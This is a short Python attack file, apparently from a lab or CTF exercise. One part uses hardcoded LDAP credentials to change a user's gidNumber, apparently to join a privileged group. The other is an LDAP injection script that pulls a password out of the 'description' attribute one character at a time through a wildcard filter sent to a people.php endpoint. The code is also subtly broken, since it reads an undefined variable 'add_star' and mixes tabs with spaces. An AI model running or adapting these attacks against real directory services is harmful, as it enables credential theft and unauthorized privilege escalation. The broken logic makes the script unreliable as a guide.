#!/usr/bin/env python3

##
##

import ldap3

server = ldap3.Server("ldaps://ldap.nope.edu", port=636, use_ssl=True)
connection = ldap3.Connection(
	server,
	"uid=dancer.jones,ou=Users,dc=nope,dc=edu",
	"defaultPASS",
	auto_bind=True,
)
connection.modify(
	"uid=dancer.jones,ou=Users,dc=nope,dc=edu",
	{"gidNumber": [(ldap3.MODIFY_REPLACE, ["27"])]},
)

##
##


import urllib.parse
import argparse,requests
import os,sys,re

def main():
    charset_path = "/var/share/seclists/Fuzzing/alphanum-case-extra.txt"
    base_url = "http://things.things.edu/users/people.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    skip_count = 6
    if_star = True
	
    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()
            ####
            char_encoded = urllib.parse.quote(char)

            # Check if '*' is found and skip the first 6 '*' characters
            if '*' in char and skip_count > 0:
                skip_count -= 1
                continue
            ####

            if '*' in char and add_star:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                if_star = False
                continue
            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
            response = requests.get(modified_url)
            if "technician" in response.text and response.status_code == 200:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                file.seek(0, 0)
		    
if __name__ == "__main__":
    main()

##
##

